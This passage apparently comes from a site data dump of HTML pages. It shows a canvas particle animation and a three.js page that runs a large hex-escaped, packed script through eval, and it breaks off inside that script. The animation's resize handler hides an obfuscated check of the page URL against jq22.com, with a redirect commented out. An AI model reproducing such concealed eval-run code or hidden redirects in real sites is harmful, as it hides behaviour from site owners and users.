checkDistance(x1, y1, x2, y2) {\n    return Math.sqrt(Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2))\n  }\n\n  function setColor() {\n    return 'rgb(' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ',' + Math.round(255 * Math.random()) + ')'\n  }\n\n  function Point(x, y, dx, dy, color) {\n    this.x = x;\n    this.y = y;\n    this.dx = dx;\n    this.dy = dy;\n    this.color = color\n  }\n\n  function initPoint(x, y) {\n    var x = x || c.width * Math.random(),\n      y = y || c.height * Math.random(),\n      dx = -delta / 2 + delta * Math.random(),\n      dy = -delta / 2 + delta * Math.random(),\n      color = setColor();\n    points.push(new Point(x, y, dx, dy, color))\n  }\n\n  function drawPoint(point) {\n    ctx.fillStyle = point.color;\n    ctx.beginPath();\n    ctx.arc(point.x, point.y, size, 0, 2 * Math.PI);\n    ctx.fill()\n  }\n\n  function drawLines(point, index) {\n    for (var i = 0; i < index; i++) {\n      var opacity = 1 - checkDistance(point.x, point.y, points[i].x, points[i].y) / distance;\n      if (opacity > 0) {\n        var grad = ctx.createLinearGradient(point.x, point.y, points[i].x, points[i].y);\n        grad.addColorStop(0, point.color);\n        grad.addColorStop(1, points[i].color);\n        ctx.strokeStyle = grad;\n        ctx.globalAlpha = opacity;\n        ctx.beginPath();\n        ctx.moveTo(point.x, point.y);\n        ctx.lineTo(points[i].x, points[i].y);\n        ctx.stroke();\n        ctx.globalAlpha = 1\n      }\n    }\n  }\n\n  function updatePosition() {\n    for (var i = 0; i < points.length; i++) {\n      var xDx = points[i].x + points[i].dx,\n        yDy = points[i].y + points[i].dy;\n      if (xDx - size < 0 || xDx + size > c.width) {\n        points[i].dx = -points[i].dx\n      }\n      if (yDy - size < 0 || yDy + size > c.height) {\n        points[i].dy = -points[i].dy\n      }\n      points[i].x += points[i].dx;\n      points[i].y += points[i].dy;\n      drawPoint(points[i]);\n      drawLines(points[i], i)\n    }\n  }\n\n  function init() {\n    points.length = 0;\n    for (var i = 0; i < count; i++) {\n      initPoint()\n    }\n  }\n\n  function resize() {\n    var GQInzO1 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 19);\n    var j2 = window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"][\"\\x73\\x75\\x62\\x73\\x74\\x72\"](0, 4);\n    if (GQInzO1 == \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\" || j2 == \"\\x66\\x69\\x6c\\x65\") {} else {\n      /*window[\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x72\\x65\\x66\"] = \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x71\\x32\\x32\\x2e\\x63\\x6f\\x6d\"*/\n    }\n    c[\"\\x77\\x69\\x64\\x74\\x68\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x57\\x69\\x64\\x74\\x68\"];\n    c[\"\\x68\\x65\\x69\\x67\\x68\\x74\"] = window[\"\\x69\\x6e\\x6e\\x65\\x72\\x48\\x65\\x69\\x67\\x68\\x74\"];\n    init()\n  }\n\n  function draw() {\n    ctx.clearRect(0, 0, c.width, c.height);\n    updatePosition();\n    window.requestAnimFrame(draw)\n  }\n  window.addEventListener(\"resize\", resize);\n  c.addEventListener(\"mouseup\", function(e) {\n    initPoint(e.pageX - c.offsetLeft, e.pageY - c.offsetTop)\n  });\n  resize();\n  draw();\n  </script>\n</body>\n\n</html>\n"},{"layout":"false","_content":"<!DOCTYPE html>\n<html>\n\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n  <title>a10</title>\n  <script src=\"three.min.js\"></script>\n  <script>\n  window[\"\\x65\\x76\\x61\\x6c\"](function(zpe1, KMbIQKO2, zaqKDBSC3, o_bFE4, _5, kqAZgqEsm6) {\n    _5 = function(zaqKDBSC3) {\n      return (zaqKDBSC3 < KMbIQKO2 ? \"\" : _5(window[\"\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\"](zaqKDBSC3 / KMbIQKO2))) + ((zaqKDBSC3 = zaqKDBSC3 % KMbIQKO2) > 35 ? window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"][\"\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\"](zaqKDBSC3 + 29) : zaqKDBSC3[\"\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\"](36))\n    };\n    if (!'' [\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](/^/, window[\"\\x53\\x74\\x72\\x69\\x6e\\x67\"])) {\n      while (zaqKDBSC3--) kqAZgqEsm6[_5(zaqKDBSC3)] = o_bFE4[zaqKDBSC3] || _5(zaqKDBSC3);\n      o_bFE4 = [function(_5) {\n        return kqAZgqEsm6[_5]\n      }];\n      _5 = function() {\n        return '\\\\\\x77\\x2b'\n      };\n      zaqKDBSC3 = 1;\n    };\n    while (zaqKDBSC3--)\n      if (o_bFE4[zaqKDBSC3]) zpe1 = zpe1[\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](new window[\"\\x52\\x65\\x67\\x45\\x78\\x70\"]('\\\\\\x62' + _5(zaqKDBSC3) + '\\\\\\x62', '\\x67'), o_bFE4[zaqKDBSC3]);\n    return zpe1;\n  }('\\x6a\\x2e\\x31\\x49\\x3d\\x68\\x28\\x69\\x2c\\x6b\\x29\\x7b\\x61\\x2e\\x69\\x3d\\x69\\x3b\\x61\\x2e\\x6b\\x3d\\x28\\x6b\\x21\\x3d\\x3d\\x47\\x29\\x3f\\x6b\\x3a\\x4c\\x3b\\x61\\x2e\\x46\\x3d\\x71\\x3b\\x61\\x2e\\x45\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x61\\x2e\\x32\\x59\\x3d\\x61\\x2e\\x45\\x3b\\x61\\x2e\\x31\\x61\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x48\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6d\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x6e\\x3d\\x32\\x53\\x3b\\x61\\x2e\\x31\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x66\\x3d\\x31\\x2e\\x30\\x3b\\x61\\x2e\\x31\\x34\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x68\\x3d\\x37\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x6b\\x3d\\x66\\x3b\\x61\\x2e\\x32\\x4a\\x3d\\x32\\x2e\\x30\\x3b\\x61\\x2e\\x32\\x63\\x3d\\x30\\x3b\\x61\\x2e\\x32\\x61\\x3d\\x65\\x2e\\x4e\\x3b\\x61\\x2e\\x32\\x75\\x3d\\x66\\x3b\\x61\\x2e\\x31\\x6a\\x3d\\x7b\\x32\\x76\\x3a\\x33\\x37\\x2c\\x32\\x74\\x3a\\x33\\x38\\x2c\\x32\\x71\\x3a\\x33\\x39\\x2c\\x32\\x77\\x3a\\x33\\x30\\x7d\\x3b\\x63 \\x39\\x3d\\x61\\x3b\\x63 \\x31\\x69\\x3d\\x30\\x2e\\x33\\x62\\x3b\\x63 \\x5a\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x59\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x30\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x55\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x57\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x56\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x54\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x6f\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x52\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x53\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x67\\x3d\\x70 \\x6a\\x2e\\x49\\x28\\x29\\x3b\\x63 \\x31\\x79\\x3d\\x30\\x3b\\x63 \\x31\\x6c\\x3d\\x30\\x3b\\x63 \\x31\\x63\\x3d\\x31\\x3b\\x63 \\x73\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x42\\x3d\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x29\\x3b\\x63 \\x31\\x47\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x3b\\x63 \\x6c\\x3d\\x7b\\x31\\x31\\x3a\\x2d\\x31\\x2c\\x31\\x4e\\x3a\\x30\\x2c\\x31\\x4f\\x3a\\x31\\x2c\\x31\\x4c\\x3a\\x32\\x2c\\x32\\x32\\x3a\\x33\\x2c\\x31\\x50\\x3a\\x34\\x2c\\x31\\x54\\x3a\\x35\\x7d\\x3b\\x63 \\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x3b\\x61\\x2e\\x32\\x4b\\x3d\\x61\\x2e\\x45\\x2e\\x31\\x73\\x28\\x29\\x3b\\x61\\x2e\\x32\\x4c\\x3d\\x61\\x2e\\x69\\x2e\\x77\\x2e\\x31\\x73\\x28\\x29\\x3b\\x63 \\x31\\x57\\x3d\\x70 \\x6a\\x2e\\x32\\x62\\x28\\x29\\x2e\\x33\\x64\\x28\\x69\\x2e\\x32\\x58\\x2c\\x70 \\x6a\\x2e\\x31\\x35\\x28\\x30\\x2c\\x31\\x2c\\x30\\x29\\x29\\x3b\\x63 \\x32\\x64\\x3d\\x31\\x57\\x2e\\x31\\x73\\x28\\x29\\x2e\\x33\\x35\\x28\\x29\\x3b\\x63 \\x32\\x38\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x33\\'\\x7d\\x3b\\x63 \\x31\\x71\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x31\\'\\x7d\\x3b\\x63 \\x31\\x7a\\x3d\\x7b\\x31\\x6d\\x3a\\'\\x33\\x32\\'\\x7d\\x3b\\x61\\x2e\\x31\\x6f\\x3d\\x68\\x28\\x4b\\x29\\x7b\\x64\\x28\\x4b\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4b\\x3d\\x31\\x41\\x28\\x29\\x7d\\x31\\x6c\\x2d\\x3d\\x4b\\x7d\\x3b\\x61\\x2e\\x32\\x30\\x3d\\x68\\x28\\x4b\\x29\\x7b\\x64\\x28\\x4b\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4b\\x3d\\x31\\x41\\x28\\x29\\x7d\\x31\\x79\\x2d\\x3d\\x4b\\x7d\\x3b\\x61\\x2e\\x31\\x4b\\x3d\\x68\\x28\\x4d\\x29\\x7b\\x63 \\x51\\x3d\\x61\\x2e\\x69\\x2e\\x32\\x69\\x2e\\x32\\x39\\x3b\\x54\\x2e\\x72\\x28\\x51\\x5b\\x30\\x5d\\x2c\\x51\\x5b\\x31\\x5d\\x2c\\x51\\x5b\\x32\\x5d\\x29\\x3b\\x54\\x2e\\x32\\x6c\\x28\\x2d\\x4d\\x29\\x3b\\x73\\x2e\\x31\\x6e\\x28\\x54\\x29\\x7d\\x3b\\x61\\x2e\\x31\\x46\\x3d\\x68\\x28\\x4d\\x29\\x7b\\x63 \\x51\\x3d\\x61\\x2e\\x69\\x2e\\x32\\x69\\x2e\\x32\\x39\\x3b\\x54\\x2e\\x72\\x28\\x51\\x5b\\x34\\x5d\\x2c\\x51\\x5b\\x35\\x5d\\x2c\\x51\\x5b\\x36\\x5d\\x29\\x3b\\x54\\x2e\\x32\\x6c\\x28\\x4d\\x29\\x3b\\x73\\x2e\\x31\\x6e\\x28\\x54\\x29\\x7d\\x3b\\x61\\x2e\\x73\\x3d\\x68\\x28\\x31\\x4d\\x2c\\x31\\x53\\x29\\x7b\\x63 \\x41\\x3d\\x39\\x2e\\x6b\\x3d\\x3d\\x3d\\x4c\\x3f\\x39\\x2e\\x6b\\x2e\\x31\\x59\\x3a\\x39\\x2e\\x6b\\x3b\\x64\\x28\\x39\\x2e\\x69\\x2e\\x32\\x6a\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x63 \\x77\\x3d\\x39\\x2e\\x69\\x2e\\x77\\x3b\\x63 \\x6f\\x3d\\x77\\x2e\\x31\\x73\\x28\\x29\\x2e\\x32\\x66\\x28\\x39\\x2e\\x45\\x29\\x3b\\x63 \\x31\\x76\\x3d\\x6f\\x2e\\x31\\x70\\x28\\x29\\x3b\\x31\\x76\\x2a\\x3d\\x65\\x2e\\x32\\x52\\x28\\x28\\x39\\x2e\\x69\\x2e\\x32\\x6a\\x2f \\x32\\x29 \\x2a \\x65\\x2e\\x4e \\x2f\\x32\\x56\\x2e\\x30\\x29\\x3b\\x39\\x2e\\x31\\x4b\\x28\\x32\\x2a\\x31\\x4d\\x2a\\x31\\x76\\x2f\\x41\\x2e\\x31\\x64\\x29\\x3b\\x39\\x2e\\x31\\x46\\x28\\x32\\x2a\\x31\\x53\\x2a\\x31\\x76\\x2f\\x41\\x2e\\x31\\x64\\x29\\x7d\\x76 \\x64\\x28\\x39\\x2e\\x69\\x2e\\x32\\x65\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x39\\x2e\\x31\\x4b\\x28\\x31\\x4d\\x2a\\x28\\x39\\x2e\\x69\\x2e\\x32\\x57\\x2d\\x39\\x2e\\x69\\x2e\\x33\\x66\\x29\\x2f\\x41\\x2e\\x32\\x35\\x29\\x3b\\x39\\x2e\\x31\\x46\\x28\\x31\\x53\\x2a\\x28\\x39\\x2e\\x69\\x2e\\x32\\x65\\x2d\\x39\\x2e\\x69\\x2e\\x33\\x71\\x29\\x2f\\x41\\x2e\\x31\\x64\\x29\\x7d\\x76\\x7b\\x33\\x70\\x2e\\x33\\x75\\x28\\'\\x33\\x73\\x3a \\x31\\x49\\x2e\\x33\\x74 \\x33\\x72 \\x33\\x77 \\x33\\x76 \\x33\\x69 \\x31\\x6d \\x2d \\x73 \\x33\\x6a\\x2e\\'\\x29\\x7d\\x7d\\x3b\\x61\\x2e\\x31\\x78\\x3d\\x68\\x28\\x4a\\x29\\x7b\\x64\\x28\\x4a\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4a\\x3d\\x31\\x43\\x28\\x29\\x7d\\x31\\x63\\x2f\\x3d\\x4a\\x7d\\x3b\\x61\\x2e\\x31\\x77\\x3d\\x68\\x28\\x4a\\x29\\x7b\\x64\\x28\\x4a\\x3d\\x3d\\x3d\\x47\\x29\\x7b\\x4a\\x3d\\x31\\x43\\x28\\x29\\x7d\\x31\\x63\\x2a\\x3d\\x4a\\x7d\\x3b\\x61\\x2e\\x75\\x3d\\x68\\x28\\x29\\x7b\\x63 \\x77\\x3d\\x61\\x2e\\x69\\x2e\\x77\\x3b\\x6f\\x2e\\x74\\x28\\x77\\x29\\x2e\\x32\\x66\\x28\\x61\\x2e\\x45\\x29\\x3b\\x6f\\x2e\\x32\\x68\\x28\\x31\\x57\\x29\\x3b\\x63 \\x31\\x74\\x3d\\x65\\x2e\\x32\\x6f\\x28\\x6f\\x2e\\x78\\x2c\\x6f\\x2e\\x7a\\x29\\x3b\\x63 \\x48\\x3d\\x65\\x2e\\x32\\x6f\\x28\\x65\\x2e\\x32\\x36\\x28\\x6f\\x2e\\x78\\x2a\\x6f\\x2e\\x78\\x2b\\x6f\\x2e\\x7a\\x2a\\x6f\\x2e\\x7a\\x29\\x2c\\x6f\\x2e\\x79\\x29\\x3b\\x64\\x28\\x61\\x2e\\x32\\x6b\\x29\\x7b\\x61\\x2e\\x31\\x6f\\x28\\x31\\x41\\x28\\x29\\x29\\x7d\\x31\\x74\\x2b\\x3d\\x31\\x6c\\x3b\\x48\\x2b\\x3d\\x31\\x79\\x3b\\x48\\x3d\\x65\\x2e\\x31\\x56\\x28\\x61\\x2e\\x32\\x63\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x61\\x2e\\x32\\x61\\x2c\\x48\\x29\\x29\\x3b\\x48\\x3d\\x65\\x2e\\x31\\x56\\x28\\x31\\x69\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x65\\x2e\\x4e\\x2d\\x31\\x69\\x2c\\x48\\x29\\x29\\x3b\\x63 \\x31\\x38\\x3d\\x6f\\x2e\\x31\\x70\\x28\\x29\\x2a\\x31\\x63\\x3b\\x31\\x38\\x3d\\x65\\x2e\\x31\\x56\\x28\\x61\\x2e\\x32\\x6d\\x2c\\x65\\x2e\\x31\\x5a\\x28\\x61\\x2e\\x32\\x6e\\x2c\\x31\\x38\\x29\\x29\\x3b\\x61\\x2e\\x45\\x2e\\x31\\x6e\\x28\\x73\\x29\\x3b\\x6f\\x2e\\x78\\x3d\\x31\\x38\\x2a\\x65\\x2e\\x31\\x48\\x28\\x48\\x29\\x2a\\x65\\x2e\\x31\\x48\\x28\\x31\\x74\\x29\\x3b\\x6f\\x2e\\x79\\x3d\\x31\\x38\\x2a\\x65\\x2e\\x32\\x67\\x28\\x48\\x29\\x3b\\x6f\\x2e\\x7a\\x3d\\x31\\x38\\x2a\\x65\\x2e\\x31\\x48\\x28\\x48\\x29\\x2a\\x65\\x2e\\x32\\x67\\x28\\x31\\x74\\x29\\x3b\\x6f\\x2e\\x32\\x68\\x28\\x32\\x64\\x29\\x3b\\x77\\x2e\\x74\\x28\\x61\\x2e\\x45\\x29\\x2e\\x31\\x6e\\x28\\x6f\\x29\\x3b\\x61\\x2e\\x69\\x2e\\x33\\x6b\\x28\\x61\\x2e\\x45\\x29\\x3b\\x31\\x6c\\x3d\\x30\\x3b\\x31\\x79\\x3d\\x30\\x3b\\x31\\x63\\x3d\\x31\\x3b\\x73\\x2e\\x72\\x28\\x30\\x2c\\x30\\x2c\\x30\\x29\\x3b\\x64\\x28\\x31\\x42\\x2e\\x33\\x6e\\x28\\x61\\x2e\\x69\\x2e\\x77\\x29\\x3e\\x31\\x69\\x7c\\x7c\\x38\\x2a\\x28\\x31\\x2d\\x31\\x47\\x2e\\x33\\x6f\\x28\\x61\\x2e\\x69\\x2e\\x32\\x37\\x29\\x29\\x3e\\x31\\x69\\x29\\x7b\\x61\\x2e\\x58\\x28\\x32\\x38\\x29\\x3b\\x31\\x42\\x2e\\x74\\x28\\x61\\x2e\\x69\\x2e\\x77\\x29\\x3b\\x31\\x47\\x2e\\x74\\x28\\x61\\x2e\\x69\\x2e\\x32\\x37\\x29\\x7d\\x7d\\x3b\\x61\\x2e\\x33\\x67\\x3d\\x68\\x28\\x29\\x7b\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x3b\\x61\\x2e\\x45\\x2e\\x74\\x28\\x61\\x2e\\x32\\x4b\\x29\\x3b\\x61\\x2e\\x69\\x2e\\x77\\x2e\\x74\\x28\\x61\\x2e\\x32\\x4c\\x29\\x3b\\x61\\x2e\\x75\\x28\\x29\\x7d\\x3b\\x68 \\x31\\x41\\x28\\x29\\x7b\\x67 \\x32\\x2a\\x65\\x2e\\x4e\\x2f \\x32\\x4d \\x2f\\x32\\x4d\\x2a\\x39\\x2e\\x32\\x4a\\x7d\\x68 \\x31\\x43\\x28\\x29\\x7b\\x67 \\x65\\x2e\\x33\\x6d\\x28\\x30\\x2e\\x33\\x6c\\x2c\\x39\\x2e\\x32\\x48\\x29\\x7d\\x68 \\x32\\x43\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x64\\x28\\x62\\x2e\\x31\\x44\\x3d\\x3d\\x3d\\x30\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x4e\\x3b\\x5a\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x7d\\x76 \\x64\\x28\\x62\\x2e\\x31\\x44\\x3d\\x3d\\x3d\\x31\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x4f\\x3b\\x52\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x7d\\x76 \\x64\\x28\\x62\\x2e\\x31\\x44\\x3d\\x3d\\x3d\\x32\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x4c\\x3b\\x55\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x7d\\x4c\\x2e\\x42\\x28\\'\\x32\\x49\\'\\x2c\\x31\\x45\\x2c\\x66\\x29\\x3b\\x4c\\x2e\\x42\\x28\\'\\x32\\x50\\'\\x2c\\x31\\x4a\\x2c\\x66\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x71\\x29\\x7d\\x68 \\x31\\x45\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x63 \\x41\\x3d\\x39\\x2e\\x6b\\x3d\\x3d\\x3d\\x4c\\x3f\\x39\\x2e\\x6b\\x2e\\x31\\x59\\x3a\\x39\\x2e\\x6b\\x3b\\x64\\x28\\x6e\\x3d\\x3d\\x3d\\x6c\\x2e\\x31\\x4e\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x59\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x3b\\x31\\x30\\x2e\\x31\\x62\\x28\\x59\\x2c\\x5a\\x29\\x3b\\x39\\x2e\\x31\\x6f\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x78\\x2f\\x41\\x2e\\x32\\x35\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x39\\x2e\\x32\\x30\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x79\\x2f\\x41\\x2e\\x31\\x64\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x5a\\x2e\\x74\\x28\\x59\\x29\\x7d\\x76 \\x64\\x28\\x6e\\x3d\\x3d\\x3d\\x6c\\x2e\\x31\\x4f\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x53\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x3b\\x31\\x67\\x2e\\x31\\x62\\x28\\x53\\x2c\\x52\\x29\\x3b\\x64\\x28\\x31\\x67\\x2e\\x79\\x3e\\x30\\x29\\x7b\\x39\\x2e\\x31\\x78\\x28\\x29\\x7d\\x76\\x7b\\x39\\x2e\\x31\\x77\\x28\\x29\\x7d\\x52\\x2e\\x74\\x28\\x53\\x29\\x7d\\x76 \\x64\\x28\\x6e\\x3d\\x3d\\x3d\\x6c\\x2e\\x31\\x4c\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x57\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x3b\\x56\\x2e\\x31\\x62\\x28\\x57\\x2c\\x55\\x29\\x3b\\x39\\x2e\\x73\\x28\\x56\\x2e\\x78\\x2c\\x56\\x2e\\x79\\x29\\x3b\\x55\\x2e\\x74\\x28\\x57\\x29\\x7d\\x39\\x2e\\x75\\x28\\x29\\x7d\\x68 \\x31\\x4a\\x28\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x4c\\x2e\\x32\\x4f\\x28\\'\\x32\\x49\\'\\x2c\\x31\\x45\\x2c\\x66\\x29\\x3b\\x4c\\x2e\\x32\\x4f\\x28\\'\\x32\\x50\\'\\x2c\\x31\\x4a\\x2c\\x66\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x7a\\x29\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x68 \\x31\\x51\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x7c\\x7c\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x62\\x2e\\x32\\x70\\x28\\x29\\x3b\\x63 \\x31\\x72\\x3d\\x30\\x3b\\x64\\x28\\x62\\x2e\\x32\\x4e\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x31\\x72\\x3d\\x62\\x2e\\x32\\x4e\\x7d\\x76 \\x64\\x28\\x62\\x2e\\x32\\x51\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x31\\x72\\x3d\\x2d\\x62\\x2e\\x32\\x51\\x7d\\x64\\x28\\x31\\x72\\x3e\\x30\\x29\\x7b\\x39\\x2e\\x31\\x77\\x28\\x29\\x7d\\x76\\x7b\\x39\\x2e\\x31\\x78\\x28\\x29\\x7d\\x39\\x2e\\x75\\x28\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x71\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x7a\\x29\\x7d\\x68 \\x32\\x72\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x7c\\x7c\\x39\\x2e\\x32\\x75\\x3d\\x3d\\x3d\\x71\\x7c\\x7c\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x32\\x31\\x28\\x62\\x2e\\x33\\x68\\x29\\x7b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x74\\x3a\\x39\\x2e\\x73\\x28\\x30\\x2c\\x39\\x2e\\x31\\x68\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x77\\x3a\\x39\\x2e\\x73\\x28\\x30\\x2c\\x2d\\x39\\x2e\\x31\\x68\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x76\\x3a\\x39\\x2e\\x73\\x28\\x39\\x2e\\x31\\x68\\x2c\\x30\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x71\\x3a\\x39\\x2e\\x73\\x28\\x2d\\x39\\x2e\\x31\\x68\\x2c\\x30\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x7d\\x7d\\x68 \\x31\\x58\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x32\\x31\\x28\\x62\\x2e\\x6d\\x2e\\x31\\x70\\x29\\x7b\\x43 \\x31\\x3a\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x32\\x32\\x3b\\x5a\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x44\\x3b\\x43 \\x32\\x3a\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x50\\x3b\\x63 \\x31\\x37\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x50\\x3b\\x63 \\x31\\x36\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x4f\\x3b\\x63 \\x4d\\x3d\\x65\\x2e\\x32\\x36\\x28\\x31\\x37\\x2a\\x31\\x37\\x2b\\x31\\x36\\x2a\\x31\\x36\\x29\\x3b\\x52\\x2e\\x72\\x28\\x30\\x2c\\x4d\\x29\\x3b\\x44\\x3b\\x43 